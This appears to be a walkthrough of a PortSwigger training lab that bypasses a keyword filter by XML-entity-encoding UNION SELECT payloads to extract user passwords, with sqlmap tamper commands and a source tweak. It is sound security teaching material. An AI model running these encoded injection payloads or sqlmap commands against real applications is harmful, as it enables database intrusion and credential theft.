---
Challenge Name: SQL injection with Filter Bypass via XML Encoding
Category: SQL Injection
Difficulty: Practitioner
Link: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
---
[![VIDEO WALKTHROUGH](https://img.youtube.com/vi/2iqMm0gMyHk/0.jpg)](https://youtu.be/2iqMm0gMyHk "SQL injection with Filter Bypass via XML Encoding")

## Background
You can perform SQL injection attacks using any controllable input that is processed as a SQL query, e.g. some websites take input in JSON/XML format and use this to query the database.

Different formats may even provide alternative ways for you to [obfuscate attacks](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding) that are otherwise blocked due to WAFs and other defense mechanisms.

Weak implementations often just look for common SQL injection keywords within the request and may be bypassed by simply encoding or escaping characters in the prohibited keywords.

The following example uses an XML escape sequence to encode the `S` character in `SELECT`:
```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```
This will be decoded server-side before being passed to the SQL interpreter.

## Challenge Description
>This [lab](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding) contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

>The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

## Solution
Modify the POST request to include a `'` and we get an error "Attack detected".
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1'</productId>
	<storeId>1</storeId>
</stockCheck>
```

Similarly, when we input a keyword like `SELECT` or `UNION` we get "Attack detected".
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1 UNION</productId>
	<storeId>1</storeId>
</stockCheck>
```

When we try `&#x53;ELECT` there is no error.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1 &#x53;ELECT</productId>
	<storeId>1</storeId>
</stockCheck>
```

So we encode `UNION SELECT username FROM users` using the CyberChef encoder.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</productId>
	<storeId>1</storeId>
</stockCheck>
```

Unfortunately, this returns `0` but if we move the payload to the `<storeId>`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
</stockCheck>
```

The request returns a list of users.
```txt
carlos
administrator
382 units
wiener
```

Switch the parameter to password, e.g. `UNION SELECT password FROM users`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;</storeId>
</stockCheck>
```

This is fine but good practice (imagine we have thousands of users) to use `WHERE` clause to filter by username, e.g. `UNION SELECT password FROM users WHERE username = 'administrator'`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x57;&#x48;&#x45;&#x52;&#x45;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x3d;&#x20;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;</storeId>
</stockCheck>
```

Recover credentials so now we can login with `administrator:<REDACTED>`.

### Bonus - SQLMap Tamper Scripts
Now for the SQLMap approach. First, list the `-h` and `-hh` then show how we can list the potential `tamper` scripts with `sqlmap --list-tampers`:
```txt
* decentities.py - HTML encode in decimal (using code points) all characters (e.g. ' -> &#39;)
* hexentities.py - HTML encode in hexadecimal (using code points) all characters (e.g. ' -> &#x31;)
* htmlencode.py - HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)
```

Unfortunately, none of these worked - was expecting `hexentities.py` to work for sure. Increase verbosity to identify the issues.
```bash
sqlmap -r new.req --batch --tamper=hexentities -v 6
```

See the ouput `"This lab is not accessible over HTTP"` so we need HTTPS.
```bash
sqlmap -r new.req --batch --tamper=hexentities --force-ssl
```

Still not working, might be better to debug by proxying through burp.
```bash
sqlmap -r new.req --batch --tamper=hexentities --force-ssl --proxy=http://127.0.0.1:8080
```

OK, so payload looks like.
```
&amp;#x31;&amp;#x20;&amp;#x4f;&amp;#x52;&amp;#x44;&amp;#x45;&amp;#x52;&amp;#x20;&amp;#x42;&amp;#x59;&amp;#x20;&amp;#x39;&amp;#x37;&amp;#x32;&amp;#x32;&amp;#x2d;&amp;#x2d;&amp;#x20;&amp;#x49;&amp;#x76;&amp;#x53;&amp;#x42;
```

But we don't want the `&amp;` - checked `-hh` and found  `--skip-urlencode`.
```bash
sqlmap -r new.req --batch --tamper=hexentities --force-ssl --proxy=http://127.0.0.1:8080 --skip-urlencode
```

This doesn't work and either does `--no-escape` - I tried to manually adjust the SQLMap code in both `convert.py` and `hexentities.py` but actually the payload looks ok when checking verbose mode.
```txt
[PAYLOAD] &#x35;&#x36;&#x32;&#x30;
```
It's only in the actual HTTP request POST data where we see.
```txt
&amp;#x35;&amp;#x36;&amp;#x32;&amp;#x30;
```

I didn't find a working solution for SQLMap, if you know how to prevent the encoding of `&amp;` leave a message on the [YT video](https://www.youtube.com/watch?v=2iqMm0gMyHk) or DM me on [Twitter](https://twitter.com/_CryptoCat) 🙂

**UPDATE:** 0x999 found a fix for this; you can remove the `.replace('&', "&amp;")` on line 1059 of the `sqlmap/lib/request/connect.py` file and it will successfully dump the database 😈 - https://twitter.com/_0x999/status/1615054152291258385

## Resources
- [CyberChef: Convert ASCII chars to HTML entities](https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(true,'Hex%20entities')&input=VEVTVA)
- [Intigriti SQLi thread](https://twitter.com/intigriti/status/1612444237106126850)